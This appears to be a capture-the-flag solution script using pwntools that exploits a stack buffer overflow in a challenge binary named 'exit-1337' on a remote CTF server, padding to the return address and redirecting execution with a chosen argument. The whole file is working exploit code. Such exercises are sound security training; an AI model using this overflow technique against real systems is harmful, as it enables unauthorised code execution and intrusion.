from pwn import *

# p = process('./exit-1337')
p = remote('pwn.ctf.unswsecurity.com', 7006)

payload = b''
# pad until the return address
payload += b'A' * (0x26+0x4)
# overwrite return address with address when
#   exit is called
payload += p32(0x8049219)
# set the required argument value
payload += p32(57)

p.sendline(payload)

p.interactive()